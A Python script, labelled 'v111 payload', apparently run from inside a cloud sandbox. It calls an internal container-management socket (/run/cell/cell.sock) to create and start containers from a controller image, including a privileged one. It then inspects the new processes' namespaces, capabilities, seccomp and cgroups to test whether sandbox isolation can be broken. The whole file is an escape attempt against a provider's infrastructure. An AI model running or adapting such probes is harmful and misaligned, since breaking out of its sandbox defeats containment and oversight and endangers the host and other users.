# -*- coding: utf-8 -*-
"""v111 payload: command 字符串覆盖入口 + 隔离性验证
P1 Create {image, command:"sleep 300"} -> Start -> 抓新进程
P2 新进程 ns/caps/cgroup/rootfs 检查
P3 privileged 变体
输出 /vercel/sandbox/v111c.out"""
import socket, struct, time, signal, json, os

OUT = '/vercel/sandbox/v111c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(200)


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def connect_unix(sockpath, path, body=b'{}', t=3.0):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(8192)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        status = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        payload = d[hdr_end + 4:hdr_end + 4 + 400] if hdr_end > 0 else b''
        log('CONN %s -> %s %r' % (path, status, payload[:250]))
        return d, status, payload
    except Exception as e:
        log('CONN %s EXC %s' % (path, type(e).__name__))
        return b'', 'EXC', b''


def ps_snapshot():
    try:
        return set(int(x) for x in os.listdir('/proc') if x.isdigit())
    except Exception:
        return set()


CELL = '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'
IMG = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'


def probe_new_container(tag, extra=None):
    log('=== %s ===' % tag)
    body = {'image': IMG, 'command': 'sleep 300'}
    if extra:
        body.update(extra)
    d, st, pay = connect_unix(CELL, '%s/Create' % CTRS, json.dumps(body).encode(), t=10)
    cid = None
    try:
        cid = json.loads(pay.decode()).get('containerId')
    except Exception:
        pass
    log('%s cid=%s' % (tag, cid))
    if not cid:
        return
    pids0 = ps_snapshot()
    d, st, pay = connect_unix(CELL, '%s/Start' % CTRS, json.dumps({'containerId': cid}).encode(), t=8)
    log('%s START -> %s %r' % (tag, st, pay[:120]))
    newp = []
    for _ in range(8):
        time.sleep(0.3)
        newp = sorted(ps_snapshot() - pids0)
        if newp:
            break
    log('%s new pids: %s' % (tag, newp))
    for p in newp:
        try:
            ns = {}
            for fld in ('pid', 'net', 'mnt', 'user', 'ipc', 'uts'):
                try:
                    ns[fld] = os.readlink('/proc/%d/ns/%s' % (p, fld))
                except Exception:
                    ns[fld] = 'ERR'
            st = open('/proc/%d/status' % p).read()
            capeff = [l for l in st.splitlines() if l.startswith('CapEff')][0].split(':')[1].strip()
            seccomp = [l for l in st.splitlines() if l.startswith('Seccomp')][0].split(':')[1].strip()
            cg = open('/proc/%d/cgroup' % p).read().replace('\n', ' ')[:150]
            try:
                hn = open('/proc/%d/root/etc/hostname' % p).read()[:40]
            except Exception:
                hn = 'ERR'
            log('%s pid %d ns=%s CapEff=%s Seccomp=%s cgroup=%s hostname=%s' % (tag, p, ns, capeff, seccomp, cg, hn))
        except Exception as e:
            log('%s pid %d inspect ERR %s' % (tag, p, type(e).__name__))
    # 清理
    d, st, pay = connect_unix(CELL, '%s/Kill' % CTRS, json.dumps({'containerId': cid}).encode(), t=5)
    log('%s KILL -> %s %r' % (tag, st, pay[:100]))
    time.sleep(0.5)
    return cid


probe_new_container('P1 command-sleep')

probe_new_container('P2 command+env', extra={'env': {'FOO': 'bar'}})

probe_new_container('P3 privileged', extra={'privileged': True})

log('V111C_DONE')
f.close()
